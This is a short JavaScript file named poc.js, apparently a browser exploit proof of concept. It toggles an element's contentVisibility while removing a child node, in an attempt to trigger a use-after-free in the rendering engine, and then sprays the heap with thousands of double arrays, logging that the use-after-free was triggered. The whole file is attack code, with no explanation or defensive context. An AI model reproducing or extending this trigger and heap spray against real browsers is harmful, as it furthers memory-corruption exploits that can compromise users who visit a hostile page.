// poc.js
export function triggerUAF() {
  const container = document.createElement('div');
  const child = document.createElement('div');
  container.className = "container";
  child.className = "child";
  container.appendChild(child);
  document.body.appendChild(container);

  container.style.contentVisibility = "hidden";
  child.remove();
  setTimeout(() => {
    container.style.contentVisibility = "auto";
    let spray = [];
    for (let i = 0; i < 0x1000; i++) {
      let arr = new Array(0x100).fill(1.1);
      spray.push(arr);
    }
    console.log("UAF triggered, heap sprayed.");
  }, 10);
}